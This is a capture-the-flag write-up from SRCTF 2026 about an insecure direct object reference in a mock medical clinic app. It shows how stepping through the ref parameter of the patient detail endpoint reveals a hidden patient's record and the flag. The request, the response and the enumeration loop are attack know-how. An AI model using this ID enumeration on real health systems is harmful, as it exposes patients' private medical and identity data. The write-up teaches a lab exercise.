---
title: "This Seems Odd"
date: 2026-08-16
description: An IDOR in the patient roster lets you enumerate every patient in the practice, including the hidden high value patient whose record holds the flag.
---

**Challenge:** https://nej3tgmbyzb6.aussiemed.ctf.urisc.club (SRCTF 2026, Day 2 - follow-on from [What's Up Doc?](SRCTF-2026/Day-1/whats-up-doc/))

**Goal:** "You are a doctor now, but it only shows you a limited number of patients. There is a high value patient you are not meant to see, discover them in the list."

**Flag:**
- `SRCTF!{th3_VIP_p4t13nt_st4nds_0ut}` - on the hidden patient's detail page

---

## Vulnerability

`GET /dashboard/patient/?ref=<patient_id>` performs an **IDOR**: it looks up the patient purely by the numeric `ref` in the URL and returns their full record to ANY logged-in user.

The doctor's roster (`/dashboard/view-patients/`) only renders 8 patients:

```
46  Christopher Kennedy
54  Richard Ward
68  Kevin Powell
156 Brandon Hall
177 Ann Moore
211 Kelsey Klein
283 Michael Howe
307 Erik Lawrence
```

...but the `patient` endpoint serves all 312 patients in the practice (IDs `1`-`312`). Patient **4** isn't in the roster which happens to be the "high value" one.

## Attack Path

### 1. Enumerate patient IDs

The patient page returns a real profile for any ID that exists, and a "No patient found" notice for the rest:

```
GET /dashboard/patient/?ref=4
```

Response:

```
<h1 class="page-title">Patient Record</h1>
<p class="notice-block">SRCTF!{th3_VIP_p4t13nt_st4nds_0ut}</p>
<tr><th>Patient ID</th><td>4</td></tr>
<tr><th>First Name</th><td>Anthony</td></tr>
<tr><th>Last Name</th><td>Harrison</td></tr>
<tr><th>Medicare Number</th><td>4353462475</td></tr>
```

A quick loop over `ref=1..312` finds Anthony Harrison - the only patient whose page carries a notice, and it's the flag.

---

## Notes

- The patient list is scoped by "your patients", but the detail endpoint isn't..?
- [I See You](SRCTF-2026/Day-2/i-see-you/), builds on this to read the full record PDF.
